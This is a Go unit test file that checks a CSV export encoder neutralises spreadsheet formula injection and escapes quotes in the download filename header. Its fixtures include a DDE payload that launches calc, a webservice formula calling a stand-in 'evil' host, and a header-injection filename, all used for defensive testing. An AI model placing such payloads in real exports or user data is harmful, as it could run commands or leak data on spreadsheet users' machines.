package commonhttp

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/require"
)

type stubCSVResponse struct {
	fileName string
	records  [][]string
}

func (s stubCSVResponse) FileName() string    { return s.fileName }
func (s stubCSVResponse) Records() [][]string { return s.records }

func TestCSVResponseEncoderSanitizesFormulaInjection(t *testing.T) {
	response := stubCSVResponse{
		fileName: "meter-export",
		records: [][]string{
			{"from", "to", "subject", "value"},
			{"2026-01-01T00:00:00Z", "2026-02-01T00:00:00Z", "=SUM(A1:A9)", "-1.5"},
			{"2026-02-01T00:00:00Z", "2026-03-01T00:00:00Z", "+cmd|' /C calc'!A0", "2e3"},
			{"2026-03-01T00:00:00Z", "2026-04-01T00:00:00Z", "@webservice(\"http://evil\")", "3"},
		},
	}

	recorder := httptest.NewRecorder()
	err := CSVResponseEncoder(t.Context(), recorder, nil, response)
	require.NoError(t, err)

	body := recorder.Body.String()
	require.Contains(t, body, "'=SUM(A1:A9)")
	require.Contains(t, body, "'+cmd|' /C calc'!A0")
	// The cell contains quotes, so the CSV writer quotes and doubles them.
	require.Contains(t, body, `"'@webservice(""http://evil"")"`)
	// Purely numeric values stay untouched so spreadsheets keep parsing them.
	require.Contains(t, body, "-1.5")
	require.Contains(t, body, "2e3")
	require.Equal(t, http.StatusOK, recorder.Code)
	require.Equal(t, "text/csv", recorder.Header().Get("Content-Type"))
}

func TestCSVResponseEncoderEscapesDispositionFilename(t *testing.T) {
	response := stubCSVResponse{
		fileName: "evil\"; header=injection",
		records:  [][]string{{"a"}},
	}

	recorder := httptest.NewRecorder()
	err := CSVResponseEncoder(t.Context(), recorder, nil, response)
	require.NoError(t, err)

	disposition := recorder.Header().Get("Content-Disposition")
	// The embedded quote is escaped, so the filename cannot terminate the
	// quoted-string and inject additional header parameters.
	require.Equal(t, `attachment; filename="evil\"; header=injection.csv"`, disposition)
}
